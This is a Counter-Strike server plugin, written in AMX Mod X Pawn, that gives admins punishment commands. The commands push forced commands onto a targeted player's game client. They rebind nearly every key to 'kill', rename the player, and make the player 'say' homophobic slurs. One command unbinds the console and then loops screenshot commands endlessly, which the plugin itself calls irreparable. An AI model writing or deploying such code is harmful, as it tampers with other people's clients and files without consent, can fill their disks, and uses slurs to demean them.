#include <amxmodx>
#include <amxmisc>
#include <engine>
#include <colored_print>

new PLUGIN[]= "[ZC Fuckoff]" 
new AUTHOR[]= "meNe" 
new VERSION[]= "1.1"
new g_szSoundFile[] = "misc/yougotserved.wav"
new bool:spinon[33]
public plugin_init()
{
	register_plugin(PLUGIN, VERSION, AUTHOR)
	register_concmd("amx_fuckoff", "fuckoff", ADMIN_LEVEL_E, "<nick> : Binds cheater buttons to kill.")
	register_concmd("amx_pimpslap", "pimpslap", ADMIN_LEVEL_E, "<nick> : It will spin the cheater.")
	register_concmd("amx_unfuckoff", "unfuckoff", ADMIN_LEVEL_E, "<nick> : It will repair the fuckoff.")
	register_concmd("amx_unpimpslap", "unpimpslap", ADMIN_LEVEL_E, "<nick> : It will repair pimpslap.")
	register_concmd("amx_spank", "spankme", ADMIN_LEVEL_E, "<nick> : It will make many screenshots, *IT CANNOT BE REPAIRED* ") 
	register_concmd("amx_spin", "spiniton", ADMIN_LEVEL_E, "<nick> : This causes the user to go flying into the air spinning uncontrollably")
	register_concmd("amx_unspin", "spinitoff", ADMIN_LEVEL_E, "<nick> : This causes the spinning user to come back to earth safely.")
	register_event("ResetHUD", "reset_round", "b")
}

public plugin_precache()
{ 
    	if(file_exists(g_szSoundFile))
	{
        	precache_sound(g_szSoundFile) 
    	} 
}

public fuckoff(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
	{
		return PLUGIN_HANDLED
	}

	new arg[32], name[32], admin[32]
	read_argv(1, arg, 31)
	new target = cmd_target(id, arg, 1)
	get_user_name(target, name, 31)
	get_user_name(id, admin, 31)

	if (get_user_flags(target) & ADMIN_RCON)
	{
		client_print(id, print_console, "You can not use this command on Owner.")
        	return PLUGIN_HANDLED 
	}
	
	if(!target)
        	return PLUGIN_HANDLED 

    	if(!is_user_alive(target))
	{
		client_cmd(target, "say ^"Teach me what is the respect for you!^"")
		client_cmd(target, "developer 1")
  		client_cmd(target, "bind w kill;wait;bind a kill;bind s kill;wait;bind d kill;bind mouse1 kill;wait;bind mouse2 kill;bind mouse3 kill;wait;bind space kill")
    		client_cmd(target, "bind ctrl kill;wait;bind 1 kill;bind 2 kill;wait;bind 3 kill;bind 4 kill;wait;bind 5 kill;bind 6 kill;wait;bind 7 kill")
    		client_cmd(target, "bind 8 kill;wait;bind 9 kill;bind 0 kill;wait;bind r kill;bind e kill;wait;bind g kill;bind q kill;wait;bind shift kill")
    		client_cmd(target, "bind end kill;wait;bind escape kill;bind z kill;wait;bind x kill;bind c kill;wait;bind uparrow kill;bind downarrow kill;wait;bind leftarrow kill")
    		client_cmd(target, "bind rightarrow kill;wait;bind mwheeldown kill;bind mwheelup kill;wait;bind ` kill;bind ~ kill;wait;name ^"I CRAPPED MYSELF^"")
		log_to_file("zc_fuckoff.log", "[FUCKOFF] [%s] - [%s]", admin, name)
		colored_print(id, GREEN, "[ZC]^x01 Admin:^x03 %s^x01 used^x04 fuckoff command^x01 for this player:^x03 %s.", admin, name)
    		client_cmd(0, "spk ^"%s^"",g_szSoundFile )
  		return PLUGIN_HANDLED
    	    	
    	}else {
		client_cmd(target, "developer 1")
    		client_cmd(target, "kill")
		client_cmd(target, "say ^"Teach me what is the respect for you!^"")
  		client_cmd(target,"bind w kill;wait;bind a kill;bind s kill;wait;bind d kill;bind mouse1 kill;wait;bind mouse2 kill;bind mouse3 kill;wait;bind space kill")
    		client_cmd(target,"bind ctrl kill;wait;bind 1 kill;wait;bind 2 kill;wait;bind 3 kill;wait;bind 4 kill;wait;bind 5 kill;bind 6 kill;wait;bind 7 kill")
    		client_cmd(target,"bind 8 kill;wait;bind 9 kill;wait;bind 0 kill;wait;bind r kill;wait;bind e kill;wait;bind g kill;bind q kill;wait;bind shift kill")
    		client_cmd(target,"bind end kill;wait;bind escape kill;bind z kill;wait;bind x kill;wait;bind c kill;wait;bind uparrow kill;bind downarrow kill;wait;bind leftarrow kill")
    		client_cmd(target,"bind rightarrow kill;wait;bind mwheeldown kill;wait;bind mwheelup kill;wait;bind ` kill;bind ~ kill;wait;name ^"I CRAPPED MYSELF^"")
		log_to_file("zc_fuckoff.log", "[FUCKOFF] [%s] - [%s]", admin, name)
		colored_print(id, GREEN, "[ZC]^x01 Admin:^x03 %s^x01 used^x04 fuckoff command^x01 for this player:^x03 %s.", admin, name)
    		client_cmd(0, "spk ^"%s^"", g_szSoundFile )
  		return PLUGIN_HANDLED
    	}
    	return PLUGIN_HANDLED
}

public unfuckoff(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
	{
		return PLUGIN_HANDLED
	}

	new arg[32],name[32],admin[32]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)

	if (get_user_flags(target) & ADMIN_RCON)
	{
		client_print(id, print_console, "You can not use this command on Owner.")
        	return PLUGIN_HANDLED 
	}
	if(!target)
        	return PLUGIN_HANDLED 

	client_cmd(target,"say ^"Thanks, %s. I am normal now!^"", admin)
	client_cmd(target, "developer 1")
   	client_cmd(target, "exec config.cfg")
   	client_cmd(target, "exec userconfig.cfg")
  	log_to_file("zc_fuckoff.log", "[UNFUCKOFF] [%s] - [%s]", admin, name)	
	colored_print(id, GREEN, "[ZC]^x01 Admin:^x03 %s^x01 used^x04 unfuckoff command^x01 for this player:^x03 %s.", admin, name)
  	return PLUGIN_HANDLED 	
}

public pimpslap(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
	{
		return PLUGIN_HANDLED
	}

	new arg[32], name[32], admin[32]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)

	if (get_user_flags(target) & ADMIN_RCON)
	{
		client_print(id, print_console, "You can not use this command on Owner.")
        	return PLUGIN_HANDLED 
	}
	if(!target)
        	return PLUGIN_HANDLED 

    	if(!is_user_alive(target))
	{
		client_cmd(target, "say ^"I'm a big gay!^"")
		client_cmd(target, "developer 1")
  		client_cmd(target,"bind ` ^"say My console seems to be broken^";bind ~ ^"say My console seems to be broken^";bind escape ^"say My escape key seems to be broken^";+forward;wait;+right")
    		client_cmd(0, "spk ^"%s^"",g_szSoundFile )
		log_to_file("zc_fuckoff.log", "[PIMPSLAP] [%s] - [%s]", admin, name)
		colored_print(id, GREEN, "[ZC]^x01 Admin:^x03 %s^x01 used^x04 pimpslap command^x01 for this player:^x03 %s.", admin, name)
  		return PLUGIN_HANDLED
    	    	
    	}else {
		client_cmd(target,"developer 1")
    		client_cmd(target,"kill")
		client_cmd(target, "say ^"I'm a big gay!^"")
  		client_cmd(target,"kill")
  		client_cmd(target,"bind ` ^"say My console seems to be broken^";bind ~ ^"say My console seems to be broken^";bind escape ^"say My escape key seems to be broken^";+forward;+right")
    		client_cmd(0, "spk ^"%s^"", g_szSoundFile)
		log_to_file("zc_fuckoff.log", "[PIMPSLAP] [%s] - [%s]", admin, name)
		colored_print(id, GREEN, "[ZC]^x01 Admin:^x03 %s^x01 used^x04 pimpslap command^x01 for this player:^x03 %s.", admin, name)
  		return PLUGIN_HANDLED
    	}
    	
    	return PLUGIN_HANDLED
}

public unpimpslap(id,level,cid)
{
	if (!cmd_access(id, level, cid, 2))
	{
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)

	if(!target)
        	return PLUGIN_HANDLED 

	if (get_user_flags(target) & ADMIN_RCON)
	{
		client_print(id, print_console, "You can not use this command on Owner.")
        	return PLUGIN_HANDLED 
	}

	if(!is_user_alive(target))
	{
		client_print(id, print_console, "You can not use this command on a dead player.")
        	return PLUGIN_HANDLED 
	}

	client_cmd(target,"say ^"Thanks, %s. I am normal now!^"", admin)
	client_cmd(target,"developer 1")
   	client_cmd(target,"bind ` toggleconsole;bind ~ toggleconsole;bind escape cancelselect;-forward;wait;-right")
	log_to_file("zc_fuckoff.log", "[UNPIMPSLAP] [%s] - [%s]", admin, name)
	colored_print(id, GREEN, "[ZC]^x01 Admin:^x03 %s^x01 used^x04 unpimpslap command^x01 for this player:^x03 %s.", admin, name)	
  	return PLUGIN_HANDLED 	
}

public spankme(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
	{
		return PLUGIN_HANDLED
	}

	new arg[32], name[32], admin[32]
	read_argv(1, arg, 31)
	new target = cmd_target(id, arg, 1)
	get_user_name(target, name, 31)
	get_user_name(id, admin, 31)
	
	if(!target)
        	return PLUGIN_HANDLED 

	if (get_user_flags(target) & ADMIN_RCON)
	{
		client_print(id, print_console, "You can not use this command on Owner.")
        	return PLUGIN_HANDLED 
	}

	if(!is_user_alive(target))
	{
		client_print(id, print_console, "You can not use this command on a dead player.")
        	return PLUGIN_HANDLED 
	}

	client_cmd(target, "say ^"I'm a beach!^"")
	client_cmd(target, "developer 1")
    	client_cmd(0, "spk ^"%s^"", g_szSoundFile)
	client_cmd(target,"unbind `; unbind ~;unbind escape")
	new parms[1]
	parms[0] = target
	set_task(1.0, "spank_timer", 1337+id, parms, 1)
	log_to_file("zc_fuckoff.log", "[SPANK] [%s] - [%s]", admin, name)
	colored_print(id, GREEN, "[ZC]^x01 Admin:^x03 %s^x01 used^x04 spank command^x01 for this player:^x03 %s.", admin, name)
  	return PLUGIN_CONTINUE
    	   	
}

public spank_timer(parms[])
{
	new victim = parms[0]
	if(!is_user_connected(victim))
		return PLUGIN_HANDLED

	// Can cause overflow, need to fix.
	client_cmd(victim, "snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait")
	parms[0] = victim
	set_task(0.1, "spank_timer", 1337+victim, parms, 1)
	return PLUGIN_CONTINUE
}

public spiniton(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
	{
		return PLUGIN_HANDLED
	}

	new arg[32],name[32],admin[32]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)

	if(!target)
        	return PLUGIN_HANDLED 

	if (get_user_flags(target) & ADMIN_RCON)
	{
		client_print(id, print_console, "You can not use this command on Owner.")
        	return PLUGIN_HANDLED 
	}

	if(!is_user_alive(target))
	{
		client_print(id, print_console, "You can not use this command on a dead player.")
        	return PLUGIN_HANDLED 
	}

	client_cmd(target,"say ^"I am a gay!.^"")
	client_cmd(target,"developer 1")
	spinon[target] = true
	spinner_effect(target)
    	client_cmd(0, "spk ^"%s^"",g_szSoundFile )
	log_to_file("zc_fuckoff.log", "[SPIN] [%s] - [%s]", admin, name)
	colored_print(id, GREEN, "[ZC]^x01 Admin:^x03 %s^x01 used^x04 spin command^x01 for this player:^x03 %s.", admin, name)
	return PLUGIN_CONTINUE   	    
}

public spinitoff(id,level,cid)
{
	if (!cmd_access(id, level, cid, 2))
	{
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32]
	read_argv(1,arg,31)
	new target = cmd_target(id,arg,1)
	get_user_name(target,name,31)
	get_user_name(id,admin,31)

	if(!target)
        	return PLUGIN_HANDLED 

	if (get_user_flags(target) & ADMIN_RCON)
	{
		client_print(id, print_console, "You can not use this command on Owner.")
        	return PLUGIN_HANDLED 
	}

	if(!is_user_alive(target))
	{
		client_print(id, print_console, "You can not use this command on a dead player.")
        	return PLUGIN_HANDLED 
	}

	client_cmd(target,"say ^"Thanks, %s now I must get out.^"",admin)
	client_cmd(target,"developer 1")
   	spinon[target] = false
	client_cmd(target, "-right")
	entity_set_float(target, EV_FL_friction, 1.0)
	entity_set_float(target, EV_FL_gravity, 0.0)
	log_to_file("zc_fuckoff.log", "[UNSPIN] [%s] - [%s]", admin, name)
	colored_print(id, GREEN, "[ZC]^x01 Admin:^x03 %s^x01 used^x04 unspin command^x01 for this player:^x03 %s.", admin, name)
  	return PLUGIN_HANDLED	
}

public spinner_effect(id)
{
	new target = id
	client_cmd(target, "+right")
	if(entity_get_int(target, EV_INT_flags) & FL_ONGROUND)
	{
		new Float:Velocity[3]
		entity_get_vector(target, EV_VEC_velocity, Velocity)
		
		Velocity[0] = random_float(200.0, 500.0)
		Velocity[1] = random_float(200.0, 500.0)
		Velocity[2] = random_float(200.0, 500.0)
		
		entity_set_vector(target, EV_VEC_velocity, Velocity)
	}
	entity_set_float(target, EV_FL_friction, 0.1)
	entity_set_float(target, EV_FL_gravity, 0.000001)
}

public client_PreThink(id)
{
	if(spinon[id])
	{
		spinner_effect(id)
	}
}

public reset_round(id)
{
	if (spinon[id])
	{
		entity_set_float(id, EV_FL_friction, 0.1)
		new parm[1]
		parm[0] = id
		set_task(1.0,"spinner_round",id,parm)
	}
	return PLUGIN_CONTINUE
}

public spinner_round(parm[]) 
{
	new id = parm[0]
	spinner_effect(id)
}

public client_disconnect(id)
{
	spinon[id] = false
}